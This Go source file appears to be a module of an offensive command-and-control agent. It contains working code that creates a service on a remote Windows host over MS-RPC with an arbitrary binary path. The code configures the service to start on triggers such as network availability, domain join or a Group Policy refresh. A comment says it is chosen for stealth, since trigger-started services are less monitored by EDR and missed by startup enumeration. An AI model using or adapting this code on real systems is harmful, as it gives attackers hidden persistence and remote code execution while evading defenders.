package commands

import (
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	svcctl "github.com/oiweiwei/go-msrpc/msrpc/scmr/svcctl/v2"
)

// Service trigger constants
const (
	svcTriggerTypeIPAddress    = 0x00000002 // SERVICE_TRIGGER_TYPE_IP_ADDRESS_AVAILABILITY
	svcTriggerTypeDomainJoin   = 0x00000003 // SERVICE_TRIGGER_TYPE_DOMAIN_JOIN
	svcTriggerTypeFirewall     = 0x00000004 // SERVICE_TRIGGER_TYPE_FIREWALL_PORT_EVENT
	svcTriggerTypeGroupPolicy  = 0x00000005 // SERVICE_TRIGGER_TYPE_GROUP_POLICY
	svcTriggerTypeCustom       = 0x00000020 // SERVICE_TRIGGER_TYPE_CUSTOM
	svcTriggerActionStart      = 0x00000001 // SERVICE_TRIGGER_ACTION_SERVICE_START
	svcConfigTriggerInfo       = 8          // SERVICE_CONFIG_TRIGGER_INFO info level
)

// Well-known trigger subtype GUIDs
var (
	// NETWORK_MANAGER_FIRST_IP_ADDRESS_ARRIVAL_GUID — fires when first IP address becomes available
	guidNetworkFirstIP = &dtyp.GUID{Data1: 0x4f27f2de, Data2: 0x14e2, Data3: 0x430b, Data4: []byte{0xa5, 0x49, 0x7c, 0xd4, 0x8c, 0xbc, 0x82, 0x45}}
	// DOMAIN_JOIN_GUID — fires when computer joins a domain
	guidDomainJoin = &dtyp.GUID{Data1: 0x1ce20aba, Data2: 0x9851, Data3: 0x4421, Data4: []byte{0x94, 0x30, 0x1d, 0xde, 0xb7, 0x66, 0xe8, 0x09}}
	// FIREWALL_PORT_OPEN_GUID — fires when a firewall port opens
	guidFirewallOpen = &dtyp.GUID{Data1: 0xb7569e07, Data2: 0x8421, Data3: 0x4ee0, Data4: []byte{0xad, 0x10, 0x86, 0x91, 0x5a, 0xfd, 0xad, 0x09}}
	// MACHINE_POLICY_PRESENT_GUID — fires on Group Policy refresh
	guidMachinePolicy = &dtyp.GUID{Data1: 0x659fcae6, Data2: 0x5bdb, Data3: 0x4da9, Data4: []byte{0xb1, 0xff, 0xca, 0x2a, 0x17, 0x8d, 0x46, 0xe0}}
)

// remoteSvcTrigger creates a new service configured with a trigger that fires
// on a specified event (network availability, domain join, firewall, group policy).
// This is stealthier than auto-start because trigger-started services are less
// monitored by EDR and don't appear in standard startup enumeration.
func remoteSvcTrigger(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for trigger action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for trigger action")
	}

	// Parse trigger type from start_type parameter (reuse for trigger type selection)
	triggerType, triggerGUID, triggerDesc := parseTriggerType(args.StartType)

	displayName := args.DisplayName
	if displayName == "" {
		displayName = args.Name
	}

	// Step 1: Create the service with demand start (not auto — the trigger handles starting)
	cli, scm, ctx, cancel, cleanup, err := remoteSvcConnect(args, scManagerCreateService|scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer cancel()
	defer cleanup()
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	createResp, err := cli.CreateServiceW(ctx, &svcctl.CreateServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DisplayName:    displayName,
		DesiredAccess:  svcAllAccess,
		ServiceType:    svcWin32OwnProcess,
		StartType:      svcStartDemand,
		ErrorControl:   1,
		BinaryPathName: args.BinPath,
	})
	if err != nil {
		return errorf("CreateServiceW failed: %v", err)
	}
	if createResp.Return != 0 {
		return errorf("CreateServiceW error: 0x%08x", createResp.Return)
	}
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: createResp.Service}) }()

	// Step 2: Set trigger configuration via ChangeServiceConfig2W
	triggerResp, err := cli.ChangeServiceConfig2W(ctx, &svcctl.ChangeServiceConfig2WRequest{
		Service: createResp.Service,
		Info: &svcctl.ConfigInfoW{
			InfoLevel: svcConfigTriggerInfo,
			ConfigInfoW: &svcctl.ConfigInfoW_ConfigInfoW{
				Value: &svcctl.ConfigInfoW_TriggerInfo{
					TriggerInfo: &svcctl.ServiceTriggerInfo{
						TriggersCount: 1,
						Triggers: []*svcctl.ServiceTrigger{
							{
								TriggerType:    triggerType,
								Action:         svcTriggerActionStart,
								TriggerSubtype: triggerGUID,
							},
						},
					},
				},
			},
		},
	})
	if err != nil {
		return errorf("ChangeServiceConfig2W (trigger) failed: %v\nNote: Service was created but trigger was not set. Clean up with: remote-service -action delete -server %s -name %s", err, args.Server, args.Name)
	}
	if triggerResp.Return != 0 {
		return errorf("ChangeServiceConfig2W (trigger) error: 0x%08x\nNote: Service was created but trigger was not set. Clean up with: remote-service -action delete -server %s -name %s", triggerResp.Return, args.Server, args.Name)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Trigger-started service created on %s ===\n", args.Server))
	sb.WriteString(fmt.Sprintf("Service Name : %s\n", args.Name))
	sb.WriteString(fmt.Sprintf("Display Name : %s\n", displayName))
	sb.WriteString(fmt.Sprintf("Binary Path  : %s\n", args.BinPath))
	sb.WriteString(fmt.Sprintf("Trigger      : %s\n", triggerDesc))
	sb.WriteString("Start Type   : DEMAND_START (trigger-activated)\n")
	sb.WriteString("\nThe service will start automatically when the trigger fires.\n")
	sb.WriteString(fmt.Sprintf("Cleanup: remote-service -action delete -server %s -name %s\n", args.Server, args.Name))

	return successResult(sb.String())
}

// parseTriggerType maps user-friendly trigger names to SVCCTL constants.
func parseTriggerType(input string) (uint32, *dtyp.GUID, string) {
	switch strings.ToLower(input) {
	case "domain-join", "domain_join", "domainjoin":
		return svcTriggerTypeDomainJoin, guidDomainJoin, "Domain Join (fires when computer joins a domain)"
	case "firewall", "firewall-open", "firewall_open":
		return svcTriggerTypeFirewall, guidFirewallOpen, "Firewall Port Open (fires when a port opens)"
	case "group-policy", "group_policy", "grouppolicy", "gpo":
		return svcTriggerTypeGroupPolicy, guidMachinePolicy, "Group Policy (fires on machine policy refresh)"
	default:
		// Default to network availability — most reliable, fires on every boot
		return svcTriggerTypeIPAddress, guidNetworkFirstIP, "Network Availability (fires when first IP address arrives)"
	}
}
